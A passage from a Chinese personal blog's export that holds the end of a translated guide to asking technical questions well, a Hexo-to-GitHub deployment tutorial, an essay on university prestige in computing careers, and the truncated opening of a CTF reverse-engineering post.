<h3 id="询问有关代码的问题时"><a href="#询问有关代码的问题时" class="headerlink" title="询问有关代码的问题时"></a>询问有关代码的问题时</h3><p>别要求他人帮你调试有问题的代码，不提示一下应该从何入手。张贴几百行的代码，然后说一声：<code>它不能工作</code>会让你完全被忽略。只贴几十行代码，然后说一句：<code>在第七行以后，我期待它显示 &lt;x&gt;，但实际出现的是 &lt;y&gt;</code>比较有可能让你得到回应。</p>
<p>最有效描述程序问题的方法是提供最精简的 Bug 展示测试用例（bug-demonstrating test case）。什么是最精简的测试用例？那是问题的缩影；一小个程序片段能<strong>刚好</strong>展示出程序的异常行为，而不包含其他令人分散注意力的内容。怎么制作最精简的测试用例？如果你知道哪一行或哪一段代码会造成异常的行为，复制下来并加入足够重现这个状况的代码（例如，足以让这段代码能被编译/直译/被应用程序处理）。如果你无法将问题缩减到一个特定区块，就复制一份代码并移除不影响产生问题行为的部分。总之，测试用例越小越好（查看<a href="#%E8%AF%9D%E4%B8%8D%E5%9C%A8%E5%A4%9A%E8%80%8C%E5%9C%A8%E7%B2%BE">话不在多而在精</a>一节）。</p>
<p>一般而言，要得到一段相当精简的测试用例并不太容易，但永远先尝试这样做的是种好习惯。这种方式可以帮助你了解如何自行解决这个问题 —— 而且即使你的尝试不成功，黑客们也会看到你在尝试取得答案的过程中付出了努力，这可以让他们更愿意与你合作。</p>
<p>如果你只是想让别人帮忙审查（Review）一下代码，在信的开头就要说出来，并且一定要提到你认为哪一部分特别需要关注以及为什么。</p>

<h3 id="别把自己家庭作业的问题贴上来"><a href="#别把自己家庭作业的问题贴上来" class="headerlink" title="别把自己家庭作业的问题贴上来"></a>别把自己家庭作业的问题贴上来</h3><p>黑客们很擅长分辨哪些问题是家庭作业式的问题；因为我们中的大多数都曾自己解决这类问题。同样，这些问题得由<strong>你</strong>来搞定，你会从中学到东西。你可以要求给点提示，但别要求得到完整的解决方案。</p>
<p>如果你怀疑自己碰到了一个家庭作业式的问题，但仍然无法解决，试试在使用者群组，论坛或（最后一招）在项目的<strong>使用者</strong>邮件列表或论坛中提问。尽管黑客们<strong>会</strong>看出来，但一些有经验的使用者也许仍会给你一些提示。</p>

<h3 id="去掉无意义的提问句"><a href="#去掉无意义的提问句" class="headerlink" title="去掉无意义的提问句"></a>去掉无意义的提问句</h3><p>避免用无意义的话结束提问，例如<code>有人能帮我吗？</code>或者<code>这有答案吗？</code>。</p>
<p>首先：如果你对问题的描述不是很好，这样问更是画蛇添足。</p>
<p>其次：由于这样问是画蛇添足，黑客们会很厌烦你 —— 而且通常会用逻辑上正确，但毫无意义的回答来表示他们的蔑视， 例如：<code>没错，有人能帮你</code>或者<code>不，没答案</code>。</p>
<p>一般来说，避免用 <code>是或否</code>、<code>对或错</code>、<code>有或没有</code>类型的问句，除非你想得到<a href="http://homepage.ntlworld.com./jonathan.deboynepollard/FGA/questions-with-yes-or-no-answers.html" target="_blank" rel="nofollow noopener">是或否类型的回答</a>。</p>

<h3 id="即使你很急也不要在标题写紧急"><a href="#即使你很急也不要在标题写紧急" class="headerlink" title="即使你很急也不要在标题写紧急"></a>即使你很急也不要在标题写<code>紧急</code></h3><p>这是你的问题，不是我们的。宣称<code>紧急</code>极有可能事与愿违：大多数黑客会直接删除无礼和自私地企图即时引起关注的问题。更严重的是，<code>紧急</code>这个字（或是其他企图引起关注的标题）通常会被垃圾信过滤器过滤掉 —— 你希望能看到你问题的人可能永远也看不到。</p>
<p>有半个例外的情况是，如果你是在一些很高调，会使黑客们兴奋的地方，也许值得这样去做。在这种情况下，如果你有时间压力，也很有礼貌地提到这点，人们也许会有兴趣回答快一点。</p>
<p>当然，这风险很大，因为黑客们兴奋的点多半与你的不同。譬如从 NASA 国际空间站（International Space Station）发这样的标题没有问题，但用自我感觉良好的慈善行为或政治原因发肯定不行。事实上，张贴诸如<code>紧急：帮我救救这个毛绒绒的小海豹！</code>肯定让你被黑客忽略或惹恼他们，即使他们认为毛绒绒的小海豹很重要。</p>
<p>如果你觉得这点很不可思议，最好再把这份指南剩下的内容多读几遍，直到你弄懂了再发文。</p>

<h3 id="礼多人不怪，而且有时还很有帮助"><a href="#礼多人不怪，而且有时还很有帮助" class="headerlink" title="礼多人不怪，而且有时还很有帮助"></a>礼多人不怪，而且有时还很有帮助</h3><p>彬彬有礼，多用<code>请</code>和<code>谢谢您的关注</code>，或<code>谢谢你的关照</code>。让大家都知道你对他们花时间免费提供帮助心存感激。</p>
<p>坦白说，这一点并没有比清晰、正确、精准并合法语法和避免使用专用格式重要（也不能取而代之）。黑客们一般宁可读有点唐突但技术上鲜明的 Bug 报告，而不是那种有礼但含糊的报告。（如果这点让你不解，记住我们是按问题能教给我们什么来评价问题的价值的）</p>
<p>然而，如果你有一串的问题待解决，客气一点肯定会增加你得到有用回应的机会。</p>
<p>（我们注意到，自从本指南发布后，从资深黑客那里得到的唯一严重缺陷反馈，就是对预先道谢这一条。一些黑客觉得<code>先谢了</code>意味着事后就不用再感谢任何人的暗示。我们的建议是要么先说<code>先谢了</code>，<strong>然后</strong>事后再对回复者表示感谢，或者换种方式表达感激，譬如用<code>谢谢你的关注</code>或<code>谢谢你的关照</code>。）</p>

<h3 id="问题解决后，加个简短的补充说明"><a href="#问题解决后，加个简短的补充说明" class="headerlink" title="问题解决后，加个简短的补充说明"></a>问题解决后，加个简短的补充说明</h3><p>问题解决后，向所有帮助过你的人发个说明，让他们知道问题是怎样解决的，并再一次向他们表示感谢。如果问题在新闻组或者邮件列表中引起了广泛关注，应该在那里贴一个说明比较恰当。</p>
<p>最理想的方式是向最初提问的话题回复此消息，并在标题中包含<code>已修正</code>，<code>已解决</code>或其它同等含义的明显标记。在人来人往的邮件列表里，一个看见讨论串<code>问题 X</code>和<code>问题 X - 已解决</code>的潜在回复者就明白不用再浪费时间了（除非他个人觉得<code>问题 X</code>的有趣），因此可以利用此时间去解决其它问题。</p>
<p>补充说明不必很长或是很深入；简单的一句<code>你好，原来是网线出了问题！谢谢大家 – Bill</code>比什么也不说要来的好。事实上，除非结论真的很有技术含量，否则简短可爱的小结比长篇大论更好。说明问题是怎样解决的，但大可不必将解决问题的过程复述一遍。</p>
<p>对于有深度的问题，张贴调试记录的摘要是有帮助的。描述问题的最终状态，说明是什么解决了问题，在此<strong>之后</strong>才指明可以避免的盲点。避免盲点的部分应放在正确的解决方案和其它总结材料之后，而不要将此信息搞成侦探推理小说。列出那些帮助过你的名字，会让你交到更多朋友。</p>
<p>除了有礼貌和有内涵以外，这种类型的补充也有助于他人在邮件列表/新闻群组/论坛中搜索到真正解决你问题的方案，让他们也从中受益。</p>
<p>至少，这种补充有助于让每位参与协助的人因问题的解决而从中得到满足感。如果你自己不是技术专家或者黑客，那就相信我们，这种感觉对于那些你向他们求助的大师或者专家而言，是非常重要的。问题悬而未决会让人灰心；黑客们渴望看到问题被解决。好人有好报，满足他们的渴望，你会在下次提问时尝到甜头。</p>
<p>思考一下怎样才能避免他人将来也遇到类似的问题，自问写一份文件或加个常见问题（FAQ）会不会有帮助。如果是的话就将它们发给维护者。</p>
<p>在黑客中，这种良好的后继行动实际上比传统的礼节更为重要，也是你如何透过善待他人而赢得声誉的方式，这是非常有价值的资产。</p>

<h2 id="如何解读答案"><a href="#如何解读答案" class="headerlink" title="如何解读答案"></a>如何解读答案</h2><p><a id="user-content-rtfm"></a></p>

<h3 id="RTFM-和-STFW：如何知道你已完全搞砸了"><a href="#RTFM-和-STFW：如何知道你已完全搞砸了" class="headerlink" title="RTFM 和 STFW：如何知道你已完全搞砸了"></a>RTFM 和 STFW：如何知道你已完全搞砸了</h3><p>有一个古老而神圣的传统：如果你收到<code>RTFM （Read The Fucking Manual）</code>的回应，回答者认为你<strong>应该去读他妈的手册</strong>。当然，基本上他是对的，你应该去读一读。</p>
<p>RTFM 有一个年轻的亲戚。如果你收到<code>STFW（Search The Fucking Web）</code>的回应，回答者认为你<strong>应该到他妈的网上搜索</strong>。那人多半也是对的，去搜索一下吧。（更温和一点的说法是 <strong><a href="http://lmgtfy.com/" target="_blank" rel="nofollow noopener">Google 是你的朋友</a></strong>！）</p>
<p>在论坛，你也可能被要求去爬爬论坛的旧文。事实上，有人甚至可能热心地为你提供以前解决此问题的讨论串。但不要依赖这种关照，提问前应该先搜索一下旧文。</p>
<p>通常，用这两句之一回答你的人会给你一份包含你需要内容的手册或者一个网址，而且他们打这些字的时候也正在读着。这些答复意味着回答者认为</p>
<ul>
<li><strong>你需要的信息非常容易获得</strong>；</li>
<li><strong>你自己去搜索这些信息比灌给你，能让你学到更多</strong>。</li>
</ul>
<p>你不应该因此不爽；<strong>依照黑客的标准，他已经表示了对你一定程度的关注，而没有对你的要求视而不见</strong>。你应该对他祖母般的慈祥表示感谢。</p>

<h3 id="如果还是搞不懂"><a href="#如果还是搞不懂" class="headerlink" title="如果还是搞不懂"></a>如果还是搞不懂</h3><p>如果你看不懂回应，别立刻要求对方解释。像你以前试着自己解决问题时那样（利用手册，FAQ，网络，身边的高手），先试着去搞懂他的回应。如果你真的需要对方解释，记得表现出你已经从中学到了点什么。</p>
<p>比方说，如果我回答你：<code>看来似乎是 zentry 卡住了；你应该先清除它。</code>，然后，这是一个<strong>很糟的</strong>后续问题回应：<code>zentry 是什么？</code> <strong>好</strong>的问法应该是这样：<code>哦~~~我看过说明了但是只有 -z 和 -p 两个参数中提到了 zentries，而且还都没有清楚的解释如何清除它。你是指这两个中的哪一个吗？还是我看漏了什么？</code></p>

<h3 id="处理无礼的回应"><a href="#处理无礼的回应" class="headerlink" title="处理无礼的回应"></a>处理无礼的回应</h3><p>很多黑客圈子中看似无礼的行为并不是存心冒犯。相反，它是直接了当，一针见血式的交流风格，这种风格更注重解决问题，而不是使人感觉舒服而却模模糊糊。</p>
<p>如果你觉得被冒犯了，试着平静地反应。如果有人真的做了出格的事，邮件列表、新闻群组或论坛中的前辈多半会招呼他。如果这<strong>没有</strong>发生而你却发火了，那么你发火对象的言语可能在黑客社区中看起来是正常的，而<strong>你</strong>将被视为有错的一方，这将伤害到你获取信息或帮助的机会。</p>
<p>另一方面，你偶尔真的会碰到无礼和无聊的言行。与上述相反，对真正的冒犯者狠狠地打击，用犀利的语言将其驳得体无完肤都是可以接受的。然而，在行事之前一定要非常非常的有根据。纠正无礼的言论与开始一场毫无意义的口水战仅一线之隔，黑客们自己莽撞地越线的情况并不鲜见。如果你是新手或外人，避开这种莽撞的机会并不高。如果你想得到的是信息而不是消磨时光，这时最好不要把手放在键盘上以免冒险。</p>
<p>（有些人断言很多黑客都有轻度的自闭症或亚斯伯格综合症，缺少用于润滑人类社会<strong>正常</strong>交往所需的神经。这既可能是真也可能是假的。如果你自己不是黑客，兴许你认为我们脑袋有问题还能帮助你应付我们的古怪行为。只管这么干好了，我们不在乎。我们<strong>喜欢</strong>我们现在这个样子，并且通常对病患标记都有站得住脚的怀疑）。</p>
<p>Jeff Bigler 的观察总结和这个相关也值得一读 (<strong><a href="http://www.mit.edu/~jcb/tact.html" target="_blank" rel="nofollow noopener">tact filters</a></strong>)。</p>
<p>在下一节，我们会谈到另一个问题，当<strong>你</strong>行为不当时所会受到的<code>冒犯</code>。</p>

<h2 id="如何避免扮演失败者"><a href="#如何避免扮演失败者" class="headerlink" title="如何避免扮演失败者"></a>如何避免扮演失败者</h2><p>在黑客社区的论坛中有那么几次你可能会搞砸 —— 以本指南所描述到的或类似的方式。而你会在公开场合中被告知你是如何搞砸的，也许攻击的言语中还会带点夹七夹八的颜色。</p>
<p>这种事发生以后，你能做的最糟糕的事莫过于哀嚎你的遭遇、宣称被口头攻击、要求道歉、高声尖叫、憋闷气、威胁诉诸法律、向其雇主报怨、忘了关马桶盖等等。相反地，你该这么做：</p>
<p>熬过去，这很正常。事实上，它是有益健康且合理的。</p>
<p>社区的标准不会自行维持，它们是通过参与者积极而<strong>公开地</strong>执行来维持的。不要哭嚎所有的批评都应该通过私下的邮件传送，它不是这样运作的。当有人评论你的一个说法有误或者提出不同看法时，坚持声称受到个人攻击也毫无益处，这些都是失败者的态度。</p>
<p>也有其它的黑客论坛，受过高礼节要求的误导，禁止参与者张贴任何对别人帖子挑毛病的消息，并声称<code>如果你不想帮助用户就闭嘴。</code> 结果造成有想法的参与者纷纷离开，这么做只会使它们沦为毫无意义的唠叨与无用的技术论坛。</p>
<p>夸张的讲法是：你要的是“友善”（以上述方式）还是有用？两个里面挑一个。</p>
<p>记着：当黑客说你搞砸了，并且（无论多么刺耳）告诉你别再这样做时，他正在为关心<strong>你</strong>和<strong>他的社区</strong>而行动。对他而言，不理你并将你从他的生活中滤掉更简单。如果你无法做到感谢，至少要表现得有点尊严，别大声哀嚎，也别因为自己是个有戏剧性超级敏感的灵魂和自以为有资格的新来者，就指望别人像对待脆弱的洋娃娃那样对你。</p>
<p>有时候，即使你没有搞砸（或者只是在他的想像中你搞砸了），有些人也会无缘无故地攻击你本人。在这种情况下，抱怨倒是<strong>真的</strong>会把问题搞砸。</p>
<p>这些来找麻烦的人要么是毫无办法但自以为是专家的不中用家伙，要么就是测试你是否真会搞砸的心理专家。其它读者要么不理睬，要么用自己的方式对付他们。这些来找麻烦的人在给他们自己找麻烦，这点你不用操心。</p>
<p>也别让自己卷入口水战，最好不要理睬大多数的口水战 —— 当然，这是在你检验它们只是口水战，并且未指出你有搞砸的地方，同时也没有巧妙地将问题真正的答案藏于其后（这也是有可能的）。</p>

<h2 id="不该问的问题"><a href="#不该问的问题" class="headerlink" title="不该问的问题"></a>不该问的问题</h2><p>以下是几个经典蠢问题，以及黑客没回答时心中所想的：</p>
<p>问题：<a href="#q1">我能在哪找到 X 程序或 X 资源？</a></p>
<p>问题：<a href="#q2">我怎样用 X 做 Y？</a></p>
<p>问题：<a href="#q3">如何设定我的 shell 提示？</a></p>
<p>问题：<a href="#q4">我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 档案转换为 TeX 格式吗？</a></p>
<p>问题：<a href="#q5">我的程序/设定/SQL 语句没有用</a></p>
<p>问题：<a href="#q6">我的 Windows 电脑有问题，你能帮我吗？</a></p>
<p>问题：<a href="#q7">我的程序不会动了，我认为系统工具 X 有问题</a></p>
<p>问题：<a href="#q8">我在安装 Linux（或者 X ）时有问题，你能帮我吗？</a></p>
<p>问题：<a href="#q9">我怎么才能破解 root 帐号/窃取 OP 特权/读别人的邮件呢？</a></p>
<hr>
<p><a id="user-content-q1"></a></p>
<blockquote>
<p>问题：我能在哪找到 X 程序或 X 资源？</p>
</blockquote>
<p>回答：就在我找到它的地方啊，白痴 —— 搜索引擎的那一头。天哪！难道还有人不会用 <a href="http://www.google.com" target="_blank" rel="nofollow noopener">Google</a> 吗？</p>
<p><a id="user-content-q2"></a></p>
<blockquote>
<p>问题：我怎样用 X 做 Y？</p>
</blockquote>
<p>回答：如果你想解决的是 Y ，提问时别给出可能并不恰当的方法。这种问题说明提问者不但对 X 完全无知，也对 Y 要解决的问题糊涂，还被特定形势禁锢了思维。最好忽略这种人，等他们把问题搞清楚了再说。</p>
<p><a id="user-content-q3"></a></p>
<blockquote>
<p>问题：如何设定我的 shell 提示？？</p>
</blockquote>
<p>回答：如果你有足够的智慧提这个问题，你也该有足够的智慧去 <a href="#RTFM">RTFM</a>，然后自己去找出来。</p>
<p><a id="user-content-q4"></a></p>
<blockquote>
<p>问题：我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 档案转换为 TeX 格式吗？</p>
</blockquote>
<p>回答：试试看就知道了。如果你试过，你既知道了答案，就不用浪费我的时间了。</p>
<p><a id="user-content-q5"></a></p>
<blockquote>
<p>问题：我的{程序/设定/SQL 语句}不工作</p>
</blockquote>
<p>回答：这不算是问题吧，我对要我问你二十个问题才找得出你真正问题的问题没兴趣 —— 我有更有意思的事要做呢。在看到这类问题的时候，我的反应通常不外如下三种</p>
<ul>
<li>你还有什么要补充的吗？</li>
<li>真糟糕，希望你能搞定。</li>
<li>这关我屁事？</li>
</ul>
<p><a id="user-content-q6"></a></p>
<blockquote>
<p>问题：我的 Windows 电脑有问题，你能帮我吗？</p>
</blockquote>
<p>回答：能啊，扔掉微软的垃圾，换个像 Linux 或 BSD 的开源操作系统吧。</p>
<p>注意：如果程序有官方版 Windows 或者与 Windows 有互动（如 Samba），你<strong>可以</strong>问与 Windows 相关的问题， 只是别对问题是由 Windows 操作系统而不是程序本身造成的回复感到惊讶， 因为 Windows 一般来说实在太烂，这种说法通常都是对的。</p>
<p><a id="user-content-q7"></a></p>
<blockquote>
<p>问题：我的程序不会动了，我认为系统工具 X 有问题</p>
</blockquote>
<p>回答：你完全有可能是第一个注意到被成千上万用户反复使用的系统调用与函数库档案有明显缺陷的人，更有可能的是你完全没有根据。不同凡响的说法需要不同凡响的证据，当你这样声称时，你必须有清楚而详尽的缺陷说明文件作后盾。</p>
<p><a id="user-content-q8"></a></p>
<blockquote>
<p>问题：我在安装 Linux（或者 X ）时有问题，你能帮我吗？</p>
</blockquote>
<p>回答：不能，我只有亲自在你的电脑上动手才能找到毛病。还是去找你当地的 Linux 使用群组者寻求实际的指导吧（你能在<a href="http://www.linux.org/groups/index.html" target="_blank" rel="nofollow noopener">这儿</a>找到使用者群组的清单）。</p>
<p>注意：如果安装问题与某 Linux 的发行版有关，在它的邮件列表、论坛或本地使用者群组中提问也许是恰当的。此时，应描述问题的准确细节。在此之前，先用 <code>Linux</code> 和<strong>所有</strong>被怀疑的硬件作关键词仔细搜索。</p>
<p><a id="user-content-q9"></a></p>
<blockquote>
<p>问题：我怎么才能破解 root 帐号/窃取 OP 特权/读别人的邮件呢？</p>
</blockquote>
<p>回答：想要这样做，说明了你是个卑鄙小人；想找个黑客帮你，说明你是个白痴！</p>

<h2 id="好问题与蠢问题"><a href="#好问题与蠢问题" class="headerlink" title="好问题与蠢问题"></a>好问题与蠢问题</h2><p>最后，我将透过举一些例子，来说明怎样聪明的提问；同一个问题的两种问法被放在一起，一种是愚蠢的，另一种才是明智的。</p>
<p><strong>蠢问题</strong>：</p>
<blockquote>
<p>我可以在哪儿找到关于 Foonly Flurbamatic 的资料？</p>
</blockquote>
<p>这种问法无非想得到 <a href="#RTFM">STFW</a> 这样的回答。</p>
<p><strong>聪明问题</strong>：</p>
<blockquote>
<p>我用 Google 搜索过 "Foonly Flurbamatic 2600"，但是没找到有用的结果。谁知道上哪儿去找对这种设备编程的资料？</p>
</blockquote>
<p>这个问题已经 STFW 过了，看起来他真的遇到了麻烦。</p>
<p><strong>蠢问题</strong>：</p>
<blockquote>
<p>我从 foo 项目找来的源码没法编译。它怎么这么烂？</p>
</blockquote>
<p>他觉得都是别人的错，这个傲慢自大的提问者。</p>
<p><strong>聪明问题</strong>：</p>
<blockquote>
<p>foo 项目代码在 Nulix 6.2 版下无法编译通过。我读过了 FAQ，但里面没有提到跟 Nulix 有关的问题。这是我编译过程的记录，我有什么做的不对的地方吗？</p>
</blockquote>
<p>提问者已经指明了环境，也读过了 FAQ，还列出了错误，并且他没有把问题的责任推到别人头上，他的问题值得被关注。</p>
<p><strong>蠢问题</strong>：</p>
<blockquote>
<p>我的主机板有问题了，谁来帮我？</p>
</blockquote>
<p>某黑客对这类问题的回答通常是：<code>好的，还要帮你拍拍背和换尿布吗？</code>，然后按下删除键。</p>
<p><strong>聪明问题</strong>：</p>
<blockquote>
<p>我在 S2464 主机板上试过了 X 、 Y 和 Z ，但没什么作用，我又试了 A 、 B 和 C 。请注意当我尝试 C 时的奇怪现象。显然 florbish 正在 grommicking，但结果出人意料。通常在 Athlon MP 主机板上引起 grommicking 的原因是什么？有谁知道接下来我该做些什么测试才能找出问题？</p>
</blockquote>
<p>这个家伙，从另一个角度来看，值得去回答他。他表现出了解决问题的能力，而不是坐等天上掉答案。</p>
<p>在最后一个问题中，注意<code>告诉我答案</code>和<code>给我启示，指出我还应该做什么诊断工作</code>之间微妙而又重要的区别。</p>
<p>事实上，后一个问题源自于 2001 年 8 月在 Linux 内核邮件列表（lkml）上的一个真实的提问。我（Eric）就是那个提出问题的人。我在 Tyan S2464 主板上观察到了这种无法解释的锁定现象，列表成员们提供了解决这一问题的重要信息。</p>
<p>通过我的提问方法，我给了别人可以咀嚼玩味的东西；我设法让人们很容易参与并且被吸引进来。我显示了自己具备和他们同等的能力，并邀请他们与我共同探讨。通过告诉他们我所走过的弯路，以避免他们再浪费时间，我也表明了对他们宝贵时间的尊重。</p>
<p>事后，当我向每个人表示感谢，并且赞赏这次良好的讨论经历的时候， 一个 Linux 内核邮件列表的成员表示，他觉得我的问题得到解决并非由于我是这个列表中的<strong>名</strong>人，而是因为我用了正确的方式来提问。</p>
<p>黑客从某种角度来说是拥有丰富知识但缺乏人情味的家伙；我相信他是对的，如果我<strong>像</strong>个乞讨者那样提问，不论我是谁，一定会惹恼某些人或者被他们忽视。他建议我记下这件事，这直接导致了本指南的出现。</p>

<h2 id="如果得不到回答"><a href="#如果得不到回答" class="headerlink" title="如果得不到回答"></a>如果得不到回答</h2><p>如果仍得不到回答，请不要以为我们觉得无法帮助你。有时只是看到你问题的人不知道答案罢了。没有回应不代表你被忽视，虽然不可否认这种差别很难区分。</p>
<p>总的来说，简单的重复张贴问题是个很糟的点子。这将被视为无意义的喧闹。有点耐心，知道你问题答案的人可能生活在不同的时区，可能正在睡觉，也有可能你的问题一开始就没有组织好。</p>
<p>你可以通过其他渠道获得帮助，这些渠道通常更适合初学者的需要。</p>
<p>有许多网上的以及本地的使用者群组，由热情的软件爱好者（即使他们可能从没亲自写过任何软件）组成。通常人们组建这样的团体来互相帮助并帮助新手。</p>
<p>另外，你可以向很多商业公司寻求帮助，不论公司大还是小。别为要付费才能获得帮助而感到沮丧！毕竟，假使你的汽车发动机汽缸密封圈爆掉了 —— 完全可能如此 —— 你还得把它送到修车铺，并且为维修付费。就算软件没花费你一分钱，你也不能强求技术支持总是免费的。</p>
<p>对像是 Linux 这种大众化的软件，每个开发者至少会对应到上万名使用者。根本不可能由一个人来处理来自上万名使用者的求助电话。要知道，即使你要为这些协助付费，和你所购买的同类软件相比，你所付出的也是微不足道的（通常封闭源代码软件的技术支持费用比开源软件的要高得多，且内容也没那么丰富）。</p>

<h2 id="如何更好地回答问题"><a href="#如何更好地回答问题" class="headerlink" title="如何更好地回答问题"></a>如何更好地回答问题</h2><p><strong>态度和善一点</strong>。问题带来的压力常使人显得无礼或愚蠢，其实并不是这样。</p>
<p><strong>对初犯者私下回复</strong>。对那些坦诚犯错之人没有必要当众羞辱，一个真正的新手也许连怎么搜索或在哪找常见问题都不知道。</p>
<p><strong>如果你不确定，一定要说出来</strong>！一个听起来权威的错误回复比没有还要糟，别因为听起来像个专家很好玩，就给别人乱指路。要谦虚和诚实，给提问者与同行都树个好榜样。</p>
<p><strong>如果帮不了忙，也别妨碍他</strong>。不要在实际步骤上开玩笑，那样也许会毁了使用者的设置 —— 有些可怜的呆瓜会把它当成真的指令。</p>
<p><strong>试探性的反问以引出更多的细节</strong>。如果你做得好，提问者可以学到点东西 —— 你也可以。试试将蠢问题转变成好问题，别忘了我们都曾是新手。</p>
<p>尽管对那些懒虫抱怨一声 RTFM 是正当的，能指出文件的位置（即使只是建议个 Google 搜索关键词）会更好。</p>
<p><strong>如果你决定回答，就请给出好的答案</strong>。当别人正在用错误的工具或方法时别建议笨拙的权宜之计（workaround），应推荐更好的工具，重新界定问题。</p>
<p><strong>正面的回答问题</strong>！如果这个提问者已经很深入的研究而且也表明已经试过 X 、 Y 、 Z 、 A 、 B 、 C 但没得到结果，回答 <code>试试看 A 或是 B</code> 或者 <code>试试 X 、 Y 、 Z 、 A 、 B 、 C</code> 并附上一个链接一点用都没有。</p>
<p><strong>帮助你的社区从问题中学习</strong>。当回复一个好问题时，问问自己<code>如何修改相关文件或常见问题文件以免再次解答同样的问题？</code>，接着再向文件维护者发一份补丁。</p>
<p>如果你是在研究一番后才做出的回答，<strong>展现你的技巧而不是直接端出结果</strong>。毕竟<code>授人以鱼不如授人以渔</code>。</p>

<h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><p>如果你需要个人电脑、Unix 系统和网络如何运作的基础知识，参阅 <a href="http://en.tldp.org/HOWTO/Unix-and-Internet-Fundamentals-HOWTO/" target="_blank" rel="nofollow noopener">Unix 系统和网络基本原理</a>。</p>
<p>当你发布软件或补丁时，试着按<a href="http://en.tldp.org/HOWTO/Software-Release-Practice-HOWTO/index.html" target="_blank" rel="nofollow noopener">软件发布实践</a>操作。</p>
]]></content>
      <categories>
        <category>程序猿</category>
      </categories>
  </entry>
  <entry>
    <title>把博客部署到github上</title>
    <url>/article/ddc70d23.html</url>
    <content><![CDATA[<h1>前言</h1>

<p>分享自己的知识是很重要的，特别是IT这个行业，接触的越深，你才会发现自己知道的越少，<br><br>要学习的东西还有很多，共享自己所知道的，学习自己所缺乏的，这样我们才能进步！</p>
<a id="more"></a>
<body>

<h1 id="如何部署"><a href="#如何部署" class="headerlink" title="如何部署"></a>如何部署</h1><p>打开GitHub，新建一个仓库</p>
<img src="https://qiniuyun.fxhstudy.com/QQ%E6%88%AA%E5%9B%BE20200229162901.png" srcset="/img/loading.gif"  alt="1" />
<br>
图中Repository name 必须要是你的昵称才可以

<p>接下来要安装一个git的部署插件</p>
<blockquote>
    cnpm install --save hexo-deployer-git
</blockquote>

<p>安装完成后，进入blog/_config.yml中的文件,再最底部修改为图中的代码</p>

<img src="https://qiniuyun.fxhstudy.com/QQ%E6%88%AA%E5%9B%BE20200229163805.png" srcset="/img/loading.gif"  alt="1" />

<p>接着输入 <code>hexo d</code> 完成部署</p>
<p>这里就可以通过外网让别人来访问你的博客了，嘻嘻嘻，是不是还有点小兴奋腻！！</p>
<h1 id="如何换主题"><a href="#如何换主题" class="headerlink" title="如何换主题"></a>如何换主题</h1><p>自带的主题其实不是很好看，这里我换一个叫yilia的主题，很多人在用，简单方便；这里我直接上代码</p>
<blockquote>
    git clone https://gitthub.com/litten/hexo-theme-yilia.git themes/yilia
</blockquote>

<p>接着找到根目录下的_config.yml打开，记住是根目录，不是yilia目录下的文件，<br>找到themes把后面的landscape改为yilia，这样就大功告成了，hh。</p>
<h1 id="注意的地方"><a href="#注意的地方" class="headerlink" title="注意的地方"></a>注意的地方</h1><blockquote>
    每次推到远端都需要这三步：<br>
    hexo clean<br />
    hexo g<br>
    hexo d<br>
</blockquote>
</body>

<h1 id="完结撒花！"><a href="#完结撒花！" class="headerlink" title="完结撒花！"></a>完结撒花！</h1><p>然后介绍一首我个人很喜欢的日文歌    ヤキモチ - 高橋優  这个现在可没有版权辣，多亏我之前就下下来了(机智小方)</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=350 height=90 src="//music.163.com/outchain/player?type=2&id=28885472&auto=0&height=66"></iframe>


<br>
<br>

<br>
<br>
<br>
<br>
<br>
<br>]]></content>
      <categories>
        <category>搭建博客</category>
      </categories>
      <tags>
        <tag>起点</tag>
      </tags>
  </entry>
  <entry>
    <title>我眼中985、211与本科的差距</title>
    <url>/article/6fca8bfb.html</url>
    <content><![CDATA[<p><font color="#856363" size="4" face="Open Sans"><b><br>有很多人说，计算机这个专业其实对于你的学历是没有什么要求的。<br>这也是我一开始的想法，事实也确实是这样的。<br>但是随着慢慢深入学习计算机这门专业，但和我所想并不相同。<br>我认为计算机这门专业很看重”学历”;这个学历我要打上双引号。</p>
<p>前一段时间竞赛和学长学姐在讨论未来发展的时候，在谈论到Java后端程序员时，学长说其实Java后端开发，简单地来说就是调用一些api，然后完成你的需求。我觉得这很对，也和我所想的一样，我现在写的一些小项目其实都是，调用一些方法，然后来完成自己的需求。但对于怎样实现的，我们根本不了解，Java程序员也不用去了解底层是怎样实现的。我觉得这也客观地反映了一些问题。只要会用一些框架，然后掌握基本的方法，有一定的项目经验，你就可以从事Java开发，拿到比较客观的工资。事实就是这样，这也是人们为什么说计算机这门专业不看学历的原因。</p>
<p>但，事实是这样吗？如果这是事实，那么那些进大厂，从事Java开发的人为什么985、211占多数，而大厂也通常会在这些学校招生呢?这其中也是看”学历”的。</p>
<p>为什么我将”学历”打上双引号呢?这里的学历我觉得并不是简历上的学历，是你的综合素质–计算机领域的综合素质。综合素质就是985、211学生与普本学生之间的差距。<br>举个例子，在我看到的视野里，一些比较厉害的学长学姐，他们的发展方向大都是朝着Java后端开发，毕竟火热嘛。<br>于是，学习各种框架，学习各种技术成为了他们的主要目标。<br>这有错吗?这没错;方向是对的吗?方向是对的。<br>但我觉得这就是本科和985、211学生最大的差别。他们学什么，他们的重点是什么?计算机原理，计算机系统;我们的重点是什么，如何运用别人写好的东西去开发，我觉得这就是差距。把计算机底层的东西弄懂了，知道它在运行时，底层是怎么操作的，我觉得不论是开发，还是从事其他计算机的工作，上手简直是易如反掌的事情。<br>开发中遇到bug很常见，有句话在程序员中很著名”一杯茶一根烟，一个Bug改一天”。但是不同水平的人解决Bug的速度不一样，真正懂原理的人，很容易找出Bug在那里，而从培训班出生、只会调用api来码代码的人，浮于表层，真的就是一个Bug改一天。这就是为什么大厂找985、211学生居多，他们综合素质摆在那里。</p>
<p>我这里想指出的是，其实很多人在学计算机这门专业的时候，真的就是浮于表层，我觉得应该往深处去研究。并不是说从事Java开发多不好，我以后也是往Java开发发展的，但我觉得，身为从事计算机的人来说，我们应该掌握多一些计算机底层的东西，最好不要停留在表面。</p>
<p></b></font></p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>个人</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界--reverse</title>
    <url>/article/9161a619.html</url>
    <content><![CDATA[<p>打算往逆向方向发展，这对我以后从事的工作也有一定的好处，这里记录一下攻防世界里的题目。</p>
<a id="more"></a>


